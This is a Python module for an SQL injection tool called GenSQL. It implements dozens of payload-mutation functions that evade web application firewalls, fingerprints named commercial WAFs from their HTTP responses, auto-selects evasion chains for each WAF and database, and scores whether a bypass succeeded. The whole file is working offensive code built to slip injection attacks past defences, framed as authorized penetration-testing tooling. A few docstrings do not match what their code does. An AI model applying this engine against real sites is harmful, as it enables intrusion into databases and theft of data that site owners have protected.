#!/usr/bin/env python
"""
GenSQL - Smart Tamper Engine
Author  : Jeevraj
Version : 2.0.0

30+ tamper functions + WAF fingerprinting + auto-selection per WAF/DBMS.
All functions take a SQL payload string and return a mutated string.
Used for bypassing WAF rules during authorized penetration testing.
"""

import re
import random
import base64
import urllib.parse
import string

# ── Individual tamper functions ───────────────────────────────────────────────

def space2comment(payload):
    """Replace spaces with /**/ comment blocks (generic WAF bypass)."""
    return payload.replace(' ', '/**/')

def space2dash(payload):
    """Replace spaces with --\\n (MySQL/MSSQL comment bypass)."""
    return payload.replace(' ', '--\n')

def space2hash(payload):
    """Replace spaces with #\\n (MySQL-specific bypass)."""
    return payload.replace(' ', '#\n')

def space2mssqlblank(payload):
    """Replace spaces with random MSSQL-safe blank characters."""
    blanks = ['\t', '\n', '\r', '\x0b', '\x0c']
    return ''.join(random.choice(blanks) if c == ' ' else c for c in payload)

def space2morehash(payload):
    """Replace spaces with alternating #hash\\n sequences."""
    counter = [0]
    def _rep(c):
        counter[0] += 1
        return '#hash%d\n' % counter[0]
    return ''.join(_rep(c) if c == ' ' else c for c in payload)

def randomcase(payload):
    """Randomly upper/lowercase each character in SQL keywords."""
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

def case_random(payload):
    """Alternate uppercase and lowercase for every other character."""
    return ''.join(c.upper() if i % 2 == 0 else c.lower()
                   for i, c in enumerate(payload))

def between_replace(payload):
    """Replace > comparisons with NOT BETWEEN 0 AND (val-1) trick."""
    return re.sub(r'>(\s*)(\d+)',
                  lambda m: 'NOT BETWEEN 0 AND %s' % str(int(m.group(2)) - 1),
                  payload)

def equaltolike(payload):
    """Replace = with LIKE (bypasses = operator filters)."""
    return re.sub(r'(?<![<>!])=(?!=)', ' LIKE ', payload)

def greatest_replace(payload):
    """Replace = N with GREATEST(val,N)=N (bypasses = operator filters)."""
    return re.sub(r'=(\s*)(\d+)',
                  lambda m: '=GREATEST(%s,%s)' % (m.group(2), m.group(2)),
                  payload)

def ifnull2ifisnull(payload):
    """Replace IFNULL(A,B) with IF(ISNULL(A),B,A) (MySQL WAF bypass)."""
    return re.sub(r'(?i)IFNULL\(([^,]+),([^)]+)\)',
                  lambda m: 'IF(ISNULL(%s),%s,%s)' % (m.group(1), m.group(2), m.group(1)),
                  payload)

def modsec_versioned(payload):
    """Wrap SQL keywords in /*!50000 ... */ versioned comments."""
    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR',
                'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE']
    result = payload
    for kw in keywords:
        result = re.sub(r'(?i)\b' + kw + r'\b',
                        '/*!50000%s*/' % kw, result)
    return result

def modsec_zero_versioned(payload):
    """Wrap keywords in /*!00000 ... */ (older MySQL version bypass)."""
    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR']
    result = payload
    for kw in keywords:
        result = re.sub(r'(?i)\b' + kw + r'\b',
                        '/*!00000%s*/' % kw, result)
    return result

def percentage_encode(payload):
    """Insert % between characters (bypasses ASP/IIS WAF rules)."""
    result = []
    for c in payload:
        result.append(c)
        if c.isalpha():
            result.append('%')
    return ''.join(result)

def plus2concat(payload):
    """Replace + with CONCAT() for MSSQL string concatenation bypass."""
    return re.sub(r"'(\w+)'\+\s*'(\w+)'",
                  lambda m: "CONCAT('%s','%s')" % (m.group(1), m.group(2)),
                  payload)

def randomcomments(payload):
    """Inject /**/ between SQL keyword characters."""
    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR',
                'SLEEP', 'BENCHMARK', 'LOAD_FILE', 'INTO']
    result = payload
    for kw in keywords:
        mutated = '/**/'.join(list(kw))
        result = re.sub(r'(?i)\b' + kw + r'\b', mutated, result)
    return result

def sp_password(payload):
    """Append sp_password to obfuscate in MSSQL logs."""
    return payload + '\n--sp_password'

def unmagicquotes(payload):
    """Replace single quotes with hex-encoded equivalents."""
    return payload.replace("'", "0x27")

def versioned_keywords(payload):
    """MySQL: wrap keywords in version comments /*!...*/."""
    return modsec_versioned(payload)

def apostrophe_mask(payload):
    """Encode apostrophe as full-width unicode %EF%BC%87."""
    return payload.replace("'", "%EF%BC%87")

def apostrophe_null(payload):
    """Encode apostrophe as %00%27 (null-byte bypass)."""
    return payload.replace("'", "%00%27")

def base64_encode(payload):
    """Base64-encode the entire payload (for base64-decoded injection points)."""
    return base64.b64encode(payload.encode()).decode()

def double_urlencode(payload):
    """Double URL-encode the payload."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

def urlencode_all(payload):
    """URL-encode every character."""
    return ''.join('%%%02X' % ord(c) for c in payload)

def unicode_encode(payload):
    """Unicode-encode non-ASCII chars as \\uXXXX."""
    return ''.join(
        '\\u%04x' % ord(c) if ord(c) > 127 else c
        for c in payload
    )

def html_encode(payload):
    """HTML-entity encode the payload."""
    return ''.join('&#%d;' % ord(c) for c in payload)

def inline_comment(payload):
    """Insert /**/ between SQL keyword characters (alternate method)."""
    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE']
    result = payload
    for kw in keywords:
        result = re.sub(r'(?i)\b' + kw + r'\b',
                        kw[0] + '/**/' + kw[1:], result)
    return result

def scientific_notation(payload):
    """Replace integer literals with scientific notation (1 -> 1e0)."""
    return re.sub(r'\b(\d+)\b', lambda m: '%se0' % m.group(1), payload)

def null_byte_inject(payload):
    """Inject %00 null bytes between characters (older WAF bypass)."""
    return '%00'.join(payload)

def concat_ws_bypass(payload):
    """Replace string literals with CONCAT_WS bypass."""
    return re.sub(r"'([^']{2,})'",
                  lambda m: "CONCAT_WS(0x20,'%s')" % "','".join(list(m.group(1))),
                  payload)

def hex_strings(payload):
    """Encode string literals as hex (0x...)."""
    def _to_hex(m):
        return '0x' + m.group(1).encode().hex()
    return re.sub(r"'([^']*)'", _to_hex, payload)

def comment_injection(payload):
    """Inject comments to split keywords: SE/**/LECT."""
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'HAVING', 'GROUP', 'ORDER']
    result = payload
    for kw in keywords:
        if len(kw) > 3:
            mid = len(kw) // 2
            split_kw = kw[:mid] + '/**/' + kw[mid:]
            result = re.sub(r'(?i)\b' + kw + r'\b', split_kw, result)
    return result

def evasion_multiline(payload):
    """Break payload across multiple lines with comments."""
    words = payload.split(' ')
    return '\n'.join(words)


# ── Tamper function registry ──────────────────────────────────────────────────

ALL_TAMPERS = {
    'space2comment':      space2comment,
    'space2dash':         space2dash,
    'space2hash':         space2hash,
    'space2mssqlblank':   space2mssqlblank,
    'space2morehash':     space2morehash,
    'randomcase':         randomcase,
    'case_random':        case_random,
    'between_replace':    between_replace,
    'equaltolike':        equaltolike,
    'greatest_replace':   greatest_replace,
    'ifnull2ifisnull':    ifnull2ifisnull,
    'modsec_versioned':   modsec_versioned,
    'modsec_zero_versioned': modsec_zero_versioned,
    'percentage_encode':  percentage_encode,
    'plus2concat':        plus2concat,
    'randomcomments':     randomcomments,
    'sp_password':        sp_password,
    'unmagicquotes':      unmagicquotes,
    'versioned_keywords': versioned_keywords,
    'apostrophe_mask':    apostrophe_mask,
    'apostrophe_null':    apostrophe_null,
    'base64_encode':      base64_encode,
    'double_urlencode':   double_urlencode,
    'urlencode_all':      urlencode_all,
    'unicode_encode':     unicode_encode,
    'html_encode':        html_encode,
    'inline_comment':     inline_comment,
    'scientific_notation':scientific_notation,
    'null_byte_inject':   null_byte_inject,
    'concat_ws_bypass':   concat_ws_bypass,
    'hex_strings':        hex_strings,
    'comment_injection':  comment_injection,
    'evasion_multiline':  evasion_multiline,
}

# ── WAF fingerprint signatures ────────────────────────────────────────────────

WAF_SIGNATURES = {
    'cloudflare': {
        'headers':  ['cf-ray', 'cf-cache-status', '__cfduid', 'cloudflare'],
        'body':     ['Cloudflare', 'cloudflare', 'Ray ID', 'cf-browser-verification',
                     'attention required', 'checking your browser'],
        'status':   [403, 503],
        'server':   ['cloudflare'],
    },
    'akamai': {
        'headers':  ['akamai', 'x-akamai', 'x-check-cacheable', 'x-akamai-staging'],
        'body':     ['Access Denied', 'The requested URL was rejected',
                     'Please consult with your administrator', 'Reference #'],
        'status':   [403],
        'server':   ['AkamaiGHost'],
    },
    'imperva': {
        'headers':  ['x-iinfo', 'x-cdn', 'x-protected-by'],
        'body':     ['Incapsula incident ID', '_Incapsula_Resource', 'imperva',
                     'Request unsuccessful', 'Incapsula'],
        'status':   [403],
        'server':   ['Imperva', 'incapsula'],
    },
    'aws_waf': {
        'headers':  ['x-amzn-requestid', 'x-amzn-trace-id', 'x-amz-cf-id'],
        'body':     ['AWS WAF', '403 ERROR', 'Request blocked',
                     'This request has been blocked'],
        'status':   [403],
        'server':   ['aws'],
    },
    'f5_bigip': {
        'headers':  ['x-cnection', 'x-wa-info', 'x-f5'],
        'body':     ['The requested URL was rejected',
                     'Please consult with your administrator',
                     'Your support ID is'],
        'status':   [403],
        'server':   ['BigIP', 'F5'],
    },
    'modsecurity': {
        'headers':  ['mod_security', 'modsecurity'],
        'body':     ['ModSecurity', 'mod_security', 'This error was generated by Mod_Security',
                     'Not Acceptable', 'rules of the site'],
        'status':   [403, 406, 501],
        'server':   ['mod_security', 'Apache'],
    },
    'barracuda': {
        'headers':  ['x-barracuda', 'barra'],
        'body':     ['Barracuda', 'You have been blocked', 'barra_counter_session'],
        'status':   [403],
        'server':   ['barracuda'],
    },
    'sucuri': {
        'headers':  ['x-sucuri-id', 'x-sucuri-cache'],
        'body':     ['Sucuri WebSite Firewall', 'Access Denied', 'sucuri.net',
                     'Cloudproxy', 'You have been blocked'],
        'status':   [403],
        'server':   ['Sucuri/Cloudproxy'],
    },
}

# ── WAF → tamper chain mapping ────────────────────────────────────────────────

WAF_TAMPER_MAP = {
    'cloudflare': [
        'space2comment', 'randomcase', 'hex_strings', 'inline_comment',
        'modsec_versioned', 'comment_injection',
    ],
    'akamai': [
        'space2dash', 'randomcomments', 'equaltolike', 'hex_strings',
        'case_random', 'scientific_notation',
    ],
    'imperva': [
        'space2comment', 'modsec_versioned', 'hex_strings',
        'between_replace', 'randomcase', 'comment_injection',
    ],
    'aws_waf': [
        'space2comment', 'randomcase', 'hex_strings',
        'inline_comment', 'double_urlencode',
    ],
    'f5_bigip': [
        'space2morehash', 'randomcomments', 'hex_strings',
        'modsec_zero_versioned', 'case_random',
    ],
    'modsecurity': [
        'space2comment', 'modsec_versioned', 'modsec_zero_versioned',
        'randomcase', 'hex_strings', 'comment_injection', 'inline_comment',
    ],
    'barracuda': [
        'space2comment', 'randomcase', 'hex_strings', 'randomcomments',
    ],
    'sucuri': [
        'space2comment', 'hex_strings', 'modsec_versioned', 'randomcase',
        'between_replace',
    ],
    'unknown': [
        'space2comment', 'randomcase', 'hex_strings', 'inline_comment',
    ],
}

# ── DBMS → tamper chain mapping ───────────────────────────────────────────────

DBMS_TAMPER_MAP = {
    'mysql': [
        'space2comment', 'space2hash', 'randomcase', 'hex_strings',
        'modsec_versioned', 'versioned_keywords', 'ifnull2ifisnull',
    ],
    'mssql': [
        'space2mssqlblank', 'plus2concat', 'sp_password', 'randomcase',
        'hex_strings', 'between_replace',
    ],
    'postgresql': [
        'space2comment', 'randomcase', 'hex_strings', 'concat_ws_bypass',
        'comment_injection',
    ],
    'oracle': [
        'space2comment', 'randomcase', 'hex_strings', 'inline_comment',
    ],
    'sqlite': [
        'space2comment', 'randomcase', 'hex_strings', 'comment_injection',
    ],
}


# ── SmartTamper class ─────────────────────────────────────────────────────────

class SmartTamper:
    """
    Smart tamper engine for GenSQL.
    Auto-selects optimal tamper chains per WAF type and DBMS.
    """

    def __init__(self, waf_type=None, dbms=None):
        self.waf_type = waf_type or 'unknown'
        self.dbms = dbms or 'mysql'
        self._applied_history = []

    def apply(self, payload, techniques=None):
        """
        Apply a chain of tamper techniques to a payload.

        Args:
            payload    : SQL injection payload string
            techniques : list of tamper function names (None = auto-select)

        Returns:
            Mutated payload string
        """
        if techniques is None:
            techniques = self._auto_select()

        result = payload
        for name in techniques:
            fn = ALL_TAMPERS.get(name)
            if fn:
                try:
                    result = fn(result)
                except Exception:
                    pass  # never crash — skip failed tamper
        self._applied_history.append({'payload': payload,
                                       'tampers': techniques,
                                       'result': result})
        return result

    def detect_waf(self, response_body, response_headers, status_code):
        """
        Fingerprint WAF from HTTP response.

        Args:
            response_body    : Response body string
            response_headers : Dict of response headers
            status_code      : HTTP status code int

        Returns:
            WAF name string ('cloudflare', 'akamai', ..., 'unknown')
        """
        body_lower = (response_body or '').lower()
        headers_str = ' '.join(str(v) for v in (response_headers or {}).values()).lower()
        headers_keys = ' '.join(str(k) for k in (response_headers or {}).keys()).lower()

        scores = {}
        for waf_name, sig in WAF_SIGNATURES.items():
            score = 0
            for h in sig.get('headers', []):
                if h.lower() in headers_keys or h.lower() in headers_str:
                    score += 3
            for b in sig.get('body', []):
                if b.lower() in body_lower:
                    score += 2
            if status_code in sig.get('status', []):
                score += 1
            for s in sig.get('server', []):
                server_header = (response_headers or {}).get('Server', '') or ''
                if s.lower() in server_header.lower():
                    score += 3
            if score > 0:
                scores[waf_name] = score

        if not scores:
            return 'unknown'
        detected = max(scores, key=scores.get)
        self.waf_type = detected
        return detected

    def auto_chain(self, payload, waf_type=None):
        """
        Apply the optimal tamper chain for the detected WAF.

        Args:
            payload  : SQL injection payload
            waf_type : WAF name (None = use self.waf_type)

        Returns:
            Mutated payload
        """
        waf = waf_type or self.waf_type or 'unknown'
        techniques = WAF_TAMPER_MAP.get(waf, WAF_TAMPER_MAP['unknown'])

        # Combine with DBMS-specific tampers
        dbms_techniques = DBMS_TAMPER_MAP.get(self.dbms, [])
        # Merge without duplicates, WAF tampers take priority
        combined = techniques[:]
        for t in dbms_techniques:
            if t not in combined:
                combined.append(t)

        return self.apply(payload, combined)

    def _auto_select(self):
        """Select tamper chain based on current waf_type and dbms."""
        waf_chain = WAF_TAMPER_MAP.get(self.waf_type, WAF_TAMPER_MAP['unknown'])
        dbms_chain = DBMS_TAMPER_MAP.get(self.dbms, [])
        combined = waf_chain[:]
        for t in dbms_chain:
            if t not in combined:
                combined.append(t)
        return combined

    def fuzz_tamper(self, payload, n=10):
        """
        Generate n random tamper combinations and return the results.

        Args:
            payload : Original SQL payload
            n       : Number of random combinations

        Returns:
            List of {'tampers': [...], 'result': str} dicts
        """
        all_names = list(ALL_TAMPERS.keys())
        results = []
        for _ in range(n):
            k = random.randint(1, min(5, len(all_names)))
            chosen = random.sample(all_names, k)
            mutated = self.apply(payload, chosen)
            results.append({'tampers': chosen, 'result': mutated})
        return results

    def score_tamper(self, original, tampered, response_body):
        """
        Score how effective a tamper was based on response analysis.
        Higher = better bypass (payload likely worked).

        Heuristics:
        - Response body longer than baseline → likely worked
        - No WAF signature found → good
        - Known error patterns found → worked (data extracted)

        Returns:
            Float 0.0 (blocked) to 1.0 (definitely worked)
        """
        score = 0.5  # neutral baseline

        body = (response_body or '').lower()

        # Positive signals (injection likely worked)
        positive = ['syntax error', 'mysql', 'postgresql', 'sqlite',
                    'ora-', 'microsoft ole db', 'odbc driver',
                    'warning: mysql', 'supplied argument is not',
                    'you have an error in your sql', 'unclosed quotation',
                    'quoted string not properly terminated']
        for p in positive:
            if p in body:
                score = min(1.0, score + 0.15)

        # Negative signals (blocked)
        negative = ['access denied', 'forbidden', 'blocked', 'illegal',
                    'attack detected', 'web application firewall',
                    'request rejected', 'modsecurity', 'incapsula',
                    'cloudflare', 'ray id', 'your ip']
        for n in negative:
            if n in body:
                score = max(0.0, score - 0.2)

        # Length delta heuristic
        if len(response_body or '') > 500:
            score = min(1.0, score + 0.1)

        # Original vs tampered similarity — very different = bypass tried hard
        if tampered != original:
            score = min(1.0, score + 0.05)

        return round(score, 3)

    def get_available_tampers(self):
        """Return list of all available tamper function names."""
        return list(ALL_TAMPERS.keys())

    def get_waf_chains(self):
        """Return all WAF → tamper chain mappings."""
        return dict(WAF_TAMPER_MAP)

    def history(self):
        """Return history of applied tamper operations."""
        return list(self._applied_history)
